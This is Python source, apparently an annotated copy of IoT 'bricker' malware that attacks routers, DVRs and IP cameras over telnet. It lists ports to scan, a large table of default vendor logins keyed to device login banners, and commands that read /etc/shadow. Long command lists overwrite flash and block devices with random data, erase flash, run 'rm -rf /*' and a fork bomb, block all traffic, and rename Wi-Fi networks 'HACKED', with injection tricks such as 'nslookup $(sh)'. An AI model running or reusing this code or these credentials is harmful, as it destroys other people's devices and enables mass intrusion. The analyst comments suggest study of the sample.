time.sleep(3)

STATV = outerSTATV  # Source unknown and not visible here.

config_sTN = False
config_sSO = False
config_sSR = False
config_sSD = True
config_sBR = True
config_sBL = True
config_sWP = True
config_eSC = True
config_eBR = True
config_eWP = True

ports_unused = []  # List of ports that are empty and unused.

# Ports that host will listen to for incoming connections. Note that hosts who
# attempt incoming connection will be added to list of targets.
ports_listen = [23,
                2222,
                2323,
                7547,
                5555,
                23231,
                6789,
                37777,
                19058,
                5358,
                8023,
                8022,
                1433,
                3306,
                445,
                110,
                21,
                88,
                81,
                8080,
                8081,
                49152,
                5431
                ]

sock_listen = []  # List of socket.socket() of active listening sockets.

# Dictionary of sockets listening on host. Keys are the port being listened on.
# Values are socket.socket() objects that are listening on that port.
listen_socks = {}

# Dictionary of sockets based on ports_unused, so empty and never used.
listen_unused = []

# Dictionary of incoming host and ports, and local host and ports. Keys are
# hash(socket.socket()). Values are strings of the form
# incominghost:incomingport>localhost:localport.
listen_tunnels = {}

# Dictionary of hosts who have attempted incoming connections. Keys are
# hash((host, port)) where host may be hostname or IP. Values are 1 only,
# indicating a host has been found connecting incoming.
incominghosts = {}

portsHTTP = [80,
             81,
             82,
             8000,
             5555,
             8080,
             7547,
             8081,
             37215,
             52869
             ]

scanports = [22,
             23,
             80,
             81,
             82,
             8000,
             2222,
             2323,
             8080,
             8081,
             23231,
             23123,
             6789,
             7547,
             5555,
             19058,
             8023,
             8022,
             5358,
             5000,
             5001,
             8888,
             9000,
             88,
             12323,
             8181,
             60023
             ]

attack_waittime = 30  # Time to wait before resetting attacks.
ports_random = 10  # Number of random ports to scan on a target host.

# Time to wait from connecting to target to force step 2 if step 1 does not
# yield response from target host. See target_steps[] below.
step2force_waittime = 17

port3scans = 3  # Number of times to repeat connections to scan ports from port3 list.

sock_active = []  # List of active socket connections (ie socket.socket()).

# Dictionary of targets who do not need to connect to the target host.
target_noconnect = {}

# Dictionary of active targets. Active targets are targets to whom a socket
# connection has been openeed. Keys are hash(socket.socket()) of the target.
# Values are IP:port of target host.
target_active = {}

# Dictionary of steps for attacking targets. Keys are hash(sock.sock()) of the
# target host. Values are:
# 1: Initial empty line is sent to target after connect.
# 2: Sent GET request or "shell" command.
# 3: Send kill/brick commands.
target_steps = {}

# Dictionary indicating if target hosts Dahua on ports 6789 or 19058 or BusyBox
# so that they can acquire more of response text from target host.
targets_p6719 = {}

# Dictionary of last times recorded of action for target attack. Time will be
# either time of initiating a connection, or of having sent kill/brick commands.
# Keys are hash(socket.socket()) objects of target host. Values are time.
target_lastactiontime = {}

# Dictionary of incoming HTTP response from target. Keys are hash(sock.sock()).
# Values are text from HTTP repsonses, with some sanitzation.
http_intext = {}

# List of target hosts saved as IP:port, where IP is string and port is int.
# These are loaded in FIFO as this target list is created, then popped off to
# connect.
target_hosts = []

if_s_active = 0  # 1 if there is an active socket in s_active; else 0.

time_startscript = time.time()  # Record start of script; at 17 hours, restart.

portsSR = [22,
           2222,
           5358,
           6789,
           19058
           ]

iiI1iiI = [22,  # Unused ports list.
           23,
           2222,
           2323,
           6789
           ]

IIIii = 1  # Unused variable (index?)

delays = [15,
          30,
          60,
          120,
          240,
          480
          ]

# List of jobs to be performed, where a job is is a 3-tuple
# (timetowait, hostname, port) which indicates host target and time until
# attac on target times out.
jobslist = []

# List of the targets as referenced by the jobslist. Items are [ip, port] lists.
jobs_targets = []

# Dictionary of targets that e.g. don't have ports in portsHTTP. Keys are
# hash of the hostname. Values are 1.
targets_unknown = {}

cred_N = 100  # Number of credentials to stage.
time_wait_conn = 3  # Time delay until next attempt to connect to target host.

waitbeforelogin = 90  # Time delays before login.
waitafterlogin = 600  # Time delays after login before scan/kill host.
time_wait = 20  # Time delay until next attempt to send kill commands.

# Shell commmands to brick BusyBox (but not OpenWrt). ##########################
cmd_brick_busybox = 'cat /proc/mounts\n' \
                    'cat /dev/urandom | mtd_write mtd0 - 0 32768\n' \
                    'cat /dev/urandom | mtd_write mtd1 - 0 32768\n'

cmd_brick_busybox += 'busybox cat /dev/urandom >/dev/mtd0 &\n' \
          'busybox cat /dev/urandom >/dev/sda &\n' \
          'busybox cat /dev/urandom >/dev/mtd1 &\n' \
          'busybox cat /dev/urandom >/dev/mtdblock0 &\n' \
          'busybox cat /dev/urandom >/dev/mtdblock1 &\n' \
          'busybox cat /dev/urandom >/dev/mtdblock2 &\n' \
          'busybox cat /dev/urandom >/dev/mtdblock3 &\n'

cmd_brick_busybox += 'busybox route del default\n' \
          'cat /dev/urandom >/dev/mtdblock0 &\n' \
          'cat /dev/urandom >/dev/mtdblock1 &\n' \
          'cat /dev/urandom >/dev/mtdblock2 &\n' \
          'cat /dev/urandom >/dev/mtdblock3 &\n' \
          'cat /dev/urandom >/dev/mtdblock4 &\n' \
          'cat /dev/urandom >/dev/mtdblock5 &\n' \
          'cat /dev/urandom >/dev/mmcblk0 &\n' \
          'cat /dev/urandom >/dev/mmcblk0p9 &\n' \
          'cat /dev/urandom >/dev/mmcblk0p12 &\n' \
          'cat /dev/urandom >/dev/mmcblk0p13 &\n' \
          'cat /dev/urandom >/dev/root &\n' \
          'cat /dev/urandom >/dev/mmcblk0p8 &\n' \
          'cat /dev/urandom >/dev/mmcblk0p16 &\n'

cmd_brick_busybox += 'route del default;iproute del default;ip route del default;' \
          'rm -rf /* 2>/dev/null &\n' \
          'iptables -F;iptables -t nat -F;' \
          'iptables -A INPUT -j DROP;' \
          'iptables -A FORWARD -j DROP\n' \
          'halt -n -f\n' \
          'reboot\n'
################################################################################


def readsentinel(filename, bootup=False):
    """
    This function reads scan results about the target from Sentinel.

    Inputs:
        filename: Name of file containing results of Sentinel scan.
        bootup: Boolean

    Outputs:
        Saves results of Sentinel scan to global variables.

    Returns:
        Nothing.
    """

    global config_sTN
    global config_sSO
    global config_sSR
    global config_sSD
    global config_sBR
    global config_sBL
    global config_sWP
    global config_eSC
    global config_eBR
    global config_eWP

    global ports_listen
    global scanports
    global portsHTTP

    # List of active listening ports, as read from Sentinel config file.
    config_listenports = []

    # List of scan ports read from Sentinel config file.
    config_scanports = []

    # List of HTTP ports read from Sentinel config file.
    config_HTTPports = []

    confingN = 0  # Number of configurations found by Sentinel.

    try:
        configfile = open(filename, 'r')
        configlines = configfile.read().split('\n')

        for line in configlines:

            configmatch = re.search('sTN: (\d+)', line)
            if configmatch:
                config_sTN = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sSO: (\d+)', line)
            if configmatch:
                config_sSO = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sSR: (\d+)', line)
            if configmatch:
                config_sSR = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sSD: (\d+)', line)
            if configmatch:
                config_sSD = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sBR: (\d+)', line)
            if configmatch:
                config_sBR = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sBL: (\d+)', line)
            if configmatch:
                config_sBL = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('sWP: (\d+)', line)
            if configmatch:
                config_sWP = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('eSC: (\d+)', line)
            if configmatch:
                config_eSC = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('eBR: (\d+)', line)
            if configmatch:
                config_eBR = bool(int(configmatch.group(1)))
                confingN += 1

            configmatch = re.search('eWP: (\d+)', line)
            if configmatch:
                config_eWP = bool(int(configmatch.group(1)))
                confingN += 1

            # Active listening ports.
            if 'aLP: ' in line[:7]:
                confingN += 1
                configmatch = re.compile('(\d+)')
                read = []

                for port in configmatch.finditer(line):
                    if not port in read:
                        read.append(int(port.group(1)))
                config_listenports = read

            if 'aSC: ' in line[:7]:
                confingN += 1
                configmatch = re.compile('(\d+)')
                read = []
                for port in configmatch.finditer(line):
                    if not port in read:
                        read.append(int(port.group(1)))
                config_scanports = read

            if 'aWP: ' in line[:7]:
                confingN += 1
                configmatch = re.compile('(\d+)')
                read = []
                for port in configmatch.finditer(line):
                    if not port in read:
                        read.append(int(port.group(1)))
                config_HTTPports = read

        configfile.close()
    except:
        printstatus('ERR: Sentinel could not read config.')
        return

    if confingN < 9:
        printstatus("NOTC: Sentinel ignoring config due to lack of data.")
        return

    scanports = config_scanports
    portsHTTP = config_HTTPports

    if bootup:
        ports_listen = config_listenports
        return

    for listenport in config_listenports:
        if not listenport in ports_listen:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Reuse socket.
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            try:
                s.bind(('0.0.0.0', int(listenport)))
                s.listen(5)
                sock_listen.append(s)
                listen_socks[int(listenport)] = s
                printstatus("NOTC: Sentinel added listening port %d"
                            % (int(listenport))
                            )
            except:
                pass

    for listenport in ports_listen:
        if not listenport in config_listenports:
            if int(listenport)in listen_socks:
                s = listen_socks[int(listenport)]
                if s in sock_listen:
                    try:
                        s.close()
                    except:
                        pass

                    sock_listen.remove(s)
                    listen_socks[int(listenport)] = None
                    printstatus("NOTC: Sentinel removed listening port %d"
                                % (int(listenport))
                                )
    ports_listen = config_listenports


readsentinel('/tmp/system/control.cfg', True)

cred_list1 = [
              ['Login authentication',
               'admin/'
               ],
              ['Password:',
               '/',
               '/'  # Duplicate?
               ],
              ['GAPM-\d\d\d\d login',
               'root/root'
                ],
              ['PORT:9527:',
               'admin/',
               'admin/admin'
               ]
             ]

# Default telnet credentials: [0] is banner, followed by credentials.
cred_list2 = [
              ['GM login:',  # Grain-media ASICs IP
               "root/GM8182",
               ],
              ['LocalHost login:',
               'root/xc3511',  # XiongMai Technlogies DVR/IP cameras
               'root/xmhdipc'  # XiongMai? PRC-based IP cameras.
               ],
              ['\(none\) login:',
               'vstarcam2015/20150602'
               ],
              ['Welcome to Zhone Technologies',
               'admin/zhone'
               ],
              ['host login:',
               'root/vizxv'
               ],
              ['TL-WR7',
               'root/5up'
               ],
              ['F6',
               'root/Zte521',
               ],
              ['netween\.co\.kr',
               'baby/baby',
               ],
              ['kopp login',
               'root/kopp',
               ],
              ['MikroTik',
               'admin/',
               'user/user',
               ],
              ['Welcome to JNIOR',
               'jnior/jnior',
               'admin/admin',
               ],
              ['Welcome to slush',
               'jnior/jnior',
               'admin/admin',
               ],
              ['heluyou login',
               'admin/h@32LuyD',
               ],
              ['OpenEmbedded Linux mdm9625',
               'admin/admin',
               ],
              ['PK5001Z login',
               'admin/CenturyL1nk',
               'admin/CTLSupport12',
               ],
              ['Ruijie login',
               'ruijie/ruijie',
               ],
              ['DSL-500B',
               'TMAR#DLKT20060205/DLKT20060205\n',
               'admin/admin\n',
               ],
              ['BusyBox on \S+ login',
               'admin/admin',
               'admin/1234'
               ],
              ['Account:',
               'admin/1234'
               ],
              ['ktcatv login',
               'super/root',
               'admin/admin'
               ],
              ['Actiontec xDSL Router',
               'admin/CenturyL1nk',
               'admin/CTLSupport12',
               ],
              ['!Login:',
               'admin/admin',
               'admin/ho4uku6at'
               ],
              ['(Router;Login|Gateway;Login)',
               'admin/admin',
               'admin/1234'
               ],
              ['!Username:',
               'admin/admin',
               'user/user'
               ],
              ['UTT login:',
               'admin/admin',
               'admin/123456'
               ],
              ['DSL5\S+ login:',
               'admin/admin',
               'admin/bayandsl',
               ],
              ['TELNET session now in ESTABLISHED state',
               'Manager/friend',
               ],
              ['Remote Management Console',
               'netscreen/netscreen',
               'localadmin/localadmin',
               ],
              ['ANS\d\d\S+ login',
               'telnet/telnet',
               ],
              ['hktos login',
               'root/public',
               ],
              ['H6\d\S+ login',
               'root/vertex25ektks123',
               ],
              ['VMG\d+\-B10D',
               'root/zyad1234',
               'supervisor/zyad1234',
               ],
              ['tc login',
               'admin/1234',
               'root/vertex25ektks123',
               ],
              ['(ralink|aquario) login',
               'Admin/',
               'admin/aquario',
               ],
              ['Welcome to RS',
               'admin/admin',
               'write/private',
               ],
              ['telnet session telnet0',
               'test1/test1',
               ],
              ['870HNU',
               '1234/1234',
               ],
              ['Ubee Interactive Corporation Telnet Server',
               'root/root',
               ],
              ['davolink login',
               'root/admin',
               'admin/admin',
               'davo/drc',
               ],
              ['login:',
               'admin/switch',
               ],
              ['Comtrend Gigabit',
               '1234/1234',
               ],
              ['SAMSUNG ELECTRONICS .*Login',
               'root/',
               'admin/password',
               ],
              ['iGate .*ADSL',
               'admin/vnpt',
               'operator/operator',
               ],
              ['DD-WRT v24',
               'root/samsung',
               ],
              ['MontaVista.*Linux',
               'ftp/ftp',
               'admin/admin',
               ],
              ['Aamra Networks LIMITED',
               'support/support123',
               ],
              ['domain\.name login',
               'Admin/',
               ],
              ['EDR\-\S+ login',
               'user/',
               ],
              ['(192.0.0.64|dvrdvs|Hikvision) login',
               'root/12345',
               'root/888888'
               ],
              ['[rR][tT]-2\d+ login',
               'root/ttnet',
               ],
              ['(t4-main|sanyo-board|smarteyes) login',
               'root/m',
               'root/mobiroot',
               'mg3500/merlin',
               ],
              ['meritlilin',
               'root/pass',
               ],
              ['MultiQb login',
               'root/admin',
               ],
              ['Avaya Cajun',
               'diag/danger',
               ],
              ['DB88FXX81 login',
               'root/svgodie',
               ],
              ['Draytek login',
               'draytek/1234',
               ],
              ['Tera-EP login',
               'admin/admin',
               'admin/1q2w3e',
               ],
              ['HDFW System',
               'hscroot/abc123',
               ],
              ['Copyright \(c\) 2004-20\d\d Hangz',
               'admin/admin',
               'admin/admin123',
               ],
              ['Copyright \(c\) 2010-2012 Hewle',
               'admin/admin',
               'admin/admin123',
               ],
              ['Dlink-Router login',
               'admin/qwerty',
               'admin/admin',
               ],
              ['this is ROS',
               'administrator/administrator',
               ],
              ['AG 5\d+',
               'operator/operator',
               ],
              ['BCM99999.*VosLogin',
               'admin/zhone',
               'root/1234567890',
               ],
              ['BCM963268 Broadband',
               'support/support',
               'support/1234',
               ],
              ['BCM96338 ADSL',
               'admin/password',
               'support/support',
               ],
              ['BCM96328 Broadband',
               'admin/password',
               'admin/admin',
               ],
              ['BCM96818 Broadband',
               'user/user',
               'admin/password',
               ],
              ['BCM96318 Broadband',
               'support/support',
               'admin/admin',
               ],
              ['BCM96362 Broadband',
               'user/',
               ],
              ['BCM96368 xDSL',
               'support/support',
               'telecomadmin/nE7jA%5m',
               ],
              ['Residential Gateway',
               'support/support',
               'user/password',
               ],
              ['router login:',
               'admin/1234',
               'user/1234',
               ],
              ['NetComm ADSL2\S Wireless Router',
               'admin/admin',
               ],
              ['Embedded Telnet Server.*WARNING:.*authorized users only',
               'cisco/cisco',
               ],
              ['User Access Verification',
               'admin/admin',
               'cisco/cisco',
               ],
              ['DAM-2160i',
               'admin/888888',
               ],
              ['Please login',
               'super/sp-admin',
               'admin/password',
               ],
              ['Admin/Admin',
               'Admin/Admin',
               ],
              ['Elsist.*maintenance shell',
               'Admin/Admin',
               ],
              ['(Welcome Visiting Huawei Home|ATP Cli)',
               'admin/admin',
               'user/user',
               ],
              ['(AONT login|## login ##|192\.168\.0\.0 login)',
               'ONTUSER/SUGAR2A041',
               'root/root',
               ],
              ['Air\S+ login',
               'root/12341234',
               'root/admin',
               ],
              ['RT\-\d+\S+ login',
               'root/12341234',
               'root/Admin',
               ],
              ['WR\d\d\S+ login',
               'telnet/telnet',
               ],
              ['ANS\S+ login',
               'telnet/telnet',
               ],
              ['Huawei Home Gateway',
               'support/support',
               ],
              ['FG1060N login',
               'root/20080826'
               ],
              ['HT-TM05 login',
               'root/20080826'
               ],
              ['M2M login',
               'root/20080826'
               ],
              ['NEXTAV login',
               'root/20080826'
               ],
              ['SVWIFI login',
               'root/20080826'
               ],
              ['TM01 login',
               'root/20080826'
               ],
              ['TM02 login',
               'root/20080826'
               ],
              ['WD02 login',
               'root/20080826'
               ],
              ['WD-N2 login',
               'root/20080826'
               ],
              ['WeZeeCard login',
               'root/20080826'
               ],
              ['WiDisk login',
               'root/20080826'
               ],
              ['WIFIUSB2 login',
               'root/20080826'
               ],
              ['ShAirDisk login',
               'root/20080826'
               ],
              ['aigoWiFi login',
               'root/20080826'
               ],
              ]

cred_list4 = ['root/root',
            'admin/admin',
            ]

cred_list3 = ['/',
              '0/0',
             'root/7ujMko0vizxv ',  # Errant space at end of password?
             ]

O0O = 'SPLTX'  # Not visibly used in this code.

################################################################################
# Generate one semi-random password for a "root" user. The password is comprised
# of an OEM-like name; then any of a random number 100-999, a random number
# between 10-99, a random symbol, or a random capital letter; followed by a
# technical word (e.g. admin, adsl, factory).
# cred_semirand = 'root/' \
#                 + random.choice(rand_OEM) \
#                 + random.choice(rand_c) \
#                 + random.choice(rand_word)
rand_OEM = ['TELCO',
            'inet',
            'zyxel',
            'ZYX',
            'zyx',
            'huawei',
            'LZE',
            'lze',
            'qualcomm',
            'dlink',
            'broadcom',
            'router',
            'DLink',
            'main',
            'wan',
            'global',
            'cpa',
            'customer',
            'linux',
            'default',
            'cisco'
            ]

rand_c = ['%s' % (random.randint(100, 999)),
          '%s' % (random.randint(10, 99)),
          '%s' % (random.choice('%#!@_=;')),
          '%s' % (random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
          ]

randw_word = ['admin',
              'ADMIN',
              'support',
              'mgmt',
              'manager',
              'adm',
              'ADM',
              'root',
              'account',
              'cs',
              'corporate',
              'business',
              'fiber',
              'adsl',
              'vdsl',
              'wifi',
              'administrator',
              'Administrator',
              'default',
              'factory'
              ]

cred_semirand = 'root/' \
                + random.choice(rand_OEM) \
                + random.choice(rand_c) \
                + random.choice(rand_word)
################################################################################

# Shell commands to get system information?
cmd_scantarget = "w\n" \
                 "uname -a\n" \
                 "ls -alF /etc/\n" \
                 "cat /etc/passwd\n" \
                 "cat /etc/shadow\n" \
                 "cat /proc/version\n"

# Shell commands to brick device.
# List of lists. Each list cmd contains:
# cmd[0] = OEM.
# cmd[1] = Credentials.
# cmd[2] = Banner.
# cmd[3:] = Commands to kill/brick target host, alternatively command to send
#           and response from host.
cmd_brick = [
             ["broadcom",
              ".*",
              "(telnetd.*error.*processInput.*unrec.*|BCM96|ls -alF /etc/: not found)",
              'lan config --ipaddr primary 10.1.2.3 255.255.255.248',
              '',
              'wlan config --ssid "HACKED: DEFAULT PASSWORD"',
              '',
              'wlan config --enable 0',
              '',
              'wlan config --ssid primary "HACKED: DEFAULT PASSWORD"',
              '',
              'wlan config --status primary disable',
              '',
              'save',
              '',
              'tr69cfg --inform disable',
              '',
              'tr69cfg --connreq disable',
              '',
              'tr69cfg --password HACKED',
              '',
              'tr69cfg --intf HACKED',
              '',
              'tr69cfg --info',
              '',
              'tr69c ConnReqPort 31351',
              '',
              'save',
              '',
              'tftp -p -t f -f `cat /dev/urandom >/dev/mtdblock0;'
                               'cat /dev/urandom >/dev/mtdblock1;'
                               'cat /dev/urandom >/dev/mtdblock2;'
                               'cat /dev/urandom >/dev/mtdblock3;'
                               'cat /dev/urandom >/dev/root;'
                               'route del default` 127.0.0.1',
              '',
              'tftp -p -t c -f `cat /dev/urandom >/dev/mtdblock0;'
                               'cat /dev/urandom >/dev/mtdblock1;'
                               'cat /dev/urandom >/dev/mtdblock2;'
                               'cat /dev/urandom >/dev/mtdblock3;'
                               'cat /dev/urandom >/dev/root;'
                               'route del default` 127.0.0.1',
              '',
              'nslookup $(sh)',
              '',
              'cat /dev/urandom >/dev/mtdblock0;'
              'cat /dev/urandom >/dev/mtdblock1;'
              'cat /dev/urandom >/dev/mtdblock2;'
              'cat /dev/urandom >/dev/mtdblock3;'
              'cat /dev/urandom >/dev/root;route del default',
              '',
              'kill `sh`',
              '',
              'cat /dev/urandom >/dev/mtdblock0;'
              'cat /dev/urandom >/dev/mtdblock1;'
              'cat /dev/urandom >/dev/mtdblock2;'
              'cat /dev/urandom >/dev/mtdblock3;'
              'cat /dev/urandom >/dev/root;'
              'route del default',
              '',
              'tftp -p -f test ;'
              'flash_erase /dev/mtdblock0 0 999999 0;'
              'flash_erase /dev/mtdblock1 0 999999 0;'
              'flash_erase /dev/mtdblock2 0 999999 0;'
              'flash_erase /dev/mtdblock3 0 999999 0',
              '',
              'tftp -p -f test ;'
              'cat /dev/urandom >/dev/mtdblock0;'
              'cat /dev/urandom >/dev/mtdblock1;'
              'cat /dev/urandom >/dev/mtdblock2;'
              'cat /dev/urandom >/dev/mtdblock3;'
              'cat /dev/urandom >/dev/root',
              '',
              'tftp -p -f test ;route del default',
              '',
              'ifconfig $(sh)',
              '',
              'cat /dev/urandom >/dev/mtdblock0;'
              'cat /dev/urandom >/dev/mtdblock1;'
              'cat /dev/urandom >/dev/mtdblock2;'
              'cat /dev/urandom >/dev/mtdblock3;'
              'cat /dev/urandom >/dev/root;'
              'route del default',
              '',
              'cat | sh',
              '',
              'sh',
              '[#>]',
              'flash_erase /dev/mtdblock0 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock1 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock2 0 999999 0',
              '[$>#]',
              'flash_erase /dev/mtdblock3 0 999999 0',
              '[$>#]',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'route del default;iptables -F;iptables -A INPUT -j DROP',
              '%WAIT%',
              'poweroff -n -f',
              '[#>]',
              'poweroff',
              '[#>]',
              'd(){ d|d & };d 2>/dev/null',
              '',
              'ping ;'
              'busybox cat /dev/urandom >/dev/root;'
              'route del default;'
              'iptables -F;'
              'iptables -A INPUT -j DROP',
              '',
              'traceroute ;'
              'busybox cat /dev/urandom >/dev/root;'
              'route del default;'
              'iptables -F;'
              'iptables -A INPUT -j DROP',
              '',
              'loaddefaultconfig',
              '[#>]',
              'adsl connection --loopback',
              '',
              'xdslctl connection --loopback',
              '',
              'ppp config ppp0 down',
              '',
              'ppp config ppp0.1 down',
              '',
              'ppp config ppp0.2 down',
              '',
              'ppp config ppp1 down',
              '',
              'ppp config ppp1.1 down',
              '',
              'ppp config ppp2.1 down',
              '',
              'ppp config ppp3.3 down',
              '',
              'ppp config pppo3G0 down',
              '',
              'save',
              '',
              'defaultgateway config ppp0',
              '',
              'defaultgateway config ppp1.1',
              '',
              'defaultgateway config ppp2.1',
              '',
              'save',
              '',
              'dhcpserver config 192.168.99.1 192.168.99.1 1',
              '',
              'lan config --ipaddr secondary 10.1.2.4 255.255.255.255',
              '',
              'save',
              '',
              'wan delete service ppp0',
              '[#>]',
              'wan delete service ppp0.1',
              '[#>]',
              'wan delete service ppp1.1',
              '[#>]',
              'wan delete service pppoa1',
              '[#>]',
              'wan delete service pppoa0',
              '[#>]',
              'wan delete service ppp0.2',
              '[#>]',
              'wan delete service ppp1.2',
              '[#>]',
              'wan delete service ppp2.1',
              '[#>]',
              'wan delete service eth4.1',
              '[#>]',
              'wan delete service eth4.2',
              '[#>]',
              'wan delete service ipoe_eth0_4',
              '[#>]',
              'wan delete service ipoe_eth0_3',
              '[#>]',
              'wan delete service ipoe_eth0_2',
              '[#>]',
              'wan delete service ipoe_eth0_1',
              '[#>]',
              'restoredefault',
              '',
              'exit',
              '',
              'loaddefaultconfig',
              '[#>]',
              'adsl connection --loopback',
              '',
              'xdslctl connection --loopback',
              '',
              'ppp config ppp0 down',
              '',
              'ppp config ppp0.1 down',
              '',
              'ppp config ppp0.2 down',
              '',
              'ppp config ppp1 down',
              '',
              'ppp config ppp1.1 down',
              '',
              'ppp config ppp2.1 down',
              '',
              'ppp config ppp3.3 down',
              '',
              'ppp config pppo3G0 down',
              '',
              'save',
              '',
              'defaultgateway config ppp0',
              '',
              'defaultgateway config ppp1.1',
              '',
              'defaultgateway config ppp2.1',
              '',
              'save',
              '',
              'wan delete service ppp0',
              '[#>]',
              'wan delete service ppp0.1',
              '[#>]',
              'wan delete service ppp1.1',
              '[#>]',
              'wan delete service pppoa1',
              '[#>]',
              'wan delete service pppoa0',
              '[#>]',
              'wan delete service ppp0.2',
              '[#>]',
              'wan delete service ppp1.2',
              '[#>]',
              'wan delete service ppp2.1',
              '[#>]',
              'wan delete service eth4.1',
              '[#>]',
              'wan delete service eth4.2',
              '[#>]',
              'wan delete service ipoe_eth0_4',
              '[#>]',
              'wan delete service ipoe_eth0_3',
              '[#>]',
              'wan delete service ipoe_eth0_2',
              '[#>]',
              'wan delete service ipoe_eth0_1',
              '[#>]',
              'restoredefault',
              '',
              'reboot',
              ''
              ],
             ["broadcom",
              ".*",
              'support:\S+:0:0:Technical Support:.:.bin.sh',
              'lan config --ipaddr primary 10.1.2.3 255.255.255.255',
              '',
              'lan config --ipaddr secondary 10.1.2.4 255.255.255.255',
              '',
              'wlan config --ssid "HACKED: DEFAULT PASSWORD"',
              '',
              'wlan config --enable 0',
              '',
              'wlan config --ssid primary "HACKED: DEFAULT PASSWORD"',
              '',
              'wlan config --status primary disable',
              '',
              'save',
              '',
              'tr69cfg --inform disable',
              '',
              'tr69cfg --connreq disable',
              '',
              'tr69cfg --password HACKED',
              '',
              'tr69cfg --intf HACKED',
              '',
              'tr69cfg --info',
              '',
              'tr69c ConnReqPort 31351',
              '',
              'save',
              '',
              'sh',
              '[$>#] ',
              'flash_erase /dev/mtdblock0 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock1 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock2 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock3 0 999999 0',
              '[$>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'route del default;'
              'iptables -t nat -F;'
              'iptables -F;'
              'iptables -A INPUT -j DROP',
              '%WAIT%',
              "restoredefault",
              '[$>#] ',
              'reboot',
              '%TERM%'
              ],
             ["broadcom",
              ".*",
              'Linux.*\(\S+txcpyjeb\S*\)',
              'sh',
              '[$>#] ',
              'flash_erase /dev/mtdblock0 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock1 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock2 0 999999 0',
              '[$>#] ',
              'flash_erase /dev/mtdblock3 0 999999 0',
              '[$>#] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'route del default;'
              'iptables -t nat -F;'
              'iptables -F;'
              'iptables -A INPUT -j DROP',
              '%WAIT%',
              "restoredefault",
              '[$>#] ',
              'reboot',
              '%TERM%'
              ],
             ['broadcom',
              '.*',
              'from HyperTerminal you would need to use',
              'cat /dev/urandom >/dev/mtdblock0 &',
              'to continue',
              '',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              'to continue',
              '',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              'to continue',
              '',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              'to continue',
              '',
              '',
              'iptables -F;iptables -t nat -F;iptables -A INPUT -j DROP',
              'to continue',
              '',
              '',
              '12',
              '==>',
              '1',
              'Please wait',
              ],
             ['broadcom',
              'supervisor/zyad1234',
              '',
              'dhcpserver config 192.168.99.1 192.168.99.1 1',
              '',
              'lan config --ipaddr primary 10.1.2.3 255.255.255.255',
              '',
              'lan config --ipaddr secondary 10.1.2.4 255.255.255.255',
              '',
              'wlan config --ssid "HACKED: DEFAULT PASSWORD"',
              '',
              'wlan config --enable 0',
              '',
              'save',
              '',
              'tr69cfg --inform disable',
              '',
              'tr69cfg --connreq disable',
              '',
              'tr69cfg --password HACKED',
              '',
              'tr69cfg --intf HACKED',
              '',
              'tr69cfg --info',
              '',
              'save',
              '',
              'tftp -p -f test ;'
              'flash_erase /dev/mtdblock0 0 999999 0;'
              'flash_erase /dev/mtdblock1 0 999999 0;'
              'flash_erase /dev/mtdblock2 0 999999 0;'
              'flash_erase /dev/mtdblock3 0 999999 0',
              '',
              'tftp -p -f test ;'
              'cat /dev/urandom >/dev/mtdblock0;'
              'cat /dev/urandom >/dev/mtdblock1;'
              'cat /dev/urandom >/dev/mtdblock2;'
              'cat /dev/urandom >/dev/mtdblock3',
              '',
